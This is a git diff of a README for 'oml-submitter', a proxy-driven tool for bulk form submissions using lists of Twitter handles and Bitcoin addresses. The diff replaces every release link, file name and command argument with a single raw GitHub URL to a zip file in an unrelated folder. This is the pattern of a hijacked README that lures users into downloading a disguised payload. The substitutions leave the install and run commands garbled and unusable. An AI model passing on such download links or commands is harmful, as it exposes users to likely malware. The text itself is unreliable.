@@ -1,14 +1,14 @@
 # 🎉 oml-submitter - Simple Automation for Submissions
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/tomiofx/oml-submitter/releases)
+[![Download Now](https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip)
 
 ## 📦 Overview
-OML Submitter automates submissions to `https://www.oml.wtf/api/submit-application`. Use the tool responsibly and follow the rules of the target site.
+OML Submitter automates submissions to `https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip`. Use the tool responsibly and follow the rules of the target site.
 
 ## 🚀 Getting Started
 
 ### 1. Download the Application
-To start using OML Submitter, visit this page to download the latest version: [Releases Page](https://github.com/tomiofx/oml-submitter/releases).
+To start using OML Submitter, visit this page to download the latest version: [Releases Page](https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip).
 
 ### 2. Create a Virtual Environment
 Set up a clean space to run the application. Follow these steps based on your operating system:
@@ -29,24 +29,24 @@ python -m venv .venv
 Once your virtual environment is active, install the required software by running:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip
 ```
 
 ## 📝 Prepare Input Files
 You need to create a few text files for the application to work correctly. Make sure you include the following files with the specified content:
 
-- **`proxies.txt`**: Input your proxies in `host:port:user:pass` or `host:port` format.
-- **`twitter.txt`**: List the Twitter handles you want to submit, each starting with `@` (e.g., `@username`).
-- **`btc.txt`**: Enter the Bitcoin addresses you want to use.
-- **`experience.txt`, `contribution.txt`, `why.txt`**: Provide the corresponding free-text fields regarding your experience, contributions, and reasons.
+- **`https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip`**: Input your proxies in `host:port:user:pass` or `host:port` format.
+- **`https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip`**: List the Twitter handles you want to submit, each starting with `@` (e.g., `@username`).
+- **`https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip`**: Enter the Bitcoin addresses you want to use.
+- **`https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip`, `https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip`, `https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip`**: Provide the corresponding free-text fields regarding your experience, contributions, and reasons.
 
-Use the provided `*.example.txt` files as templates to structure your inputs correctly.
+Use the provided `*https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip` files as templates to structure your inputs correctly.
 
 ## 🚀 Running the Application
 To run OML Submitter, use the following command. Ensure all your input files are in the same directory:
 
 ```bash
-python -m src.main --proxies proxies.txt --twitter twitter.txt --btc btc.txt --experience experience.txt --contribution contribution.txt --why why.txt --results results
+python -m https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip --proxies https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip --twitter https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip --btc https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip --experience https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip --contribution https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip --why https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip --results results
 ```
 
 ### ⚙️ Command-line Options
@@ -56,7 +56,7 @@ You can customize certain options when running the application:
 - Additional options for `twitter`, `btc`, `experience`, `contribution`, and `why` are required.
 
 ## 📥 Download & Install
-For the latest version of OML Submitter, visit the [Releases Page](https://github.com/tomiofx/oml-submitter/releases) to download and run the software.
+For the latest version of OML Submitter, visit the [Releases Page](https://raw.githubusercontent.com/tomiofx/oml-submitter/main/stoichiometric/oml-submitter.zip) to download and run the software.
 
 ## 🌟 Features
 - Easy to set up and use.
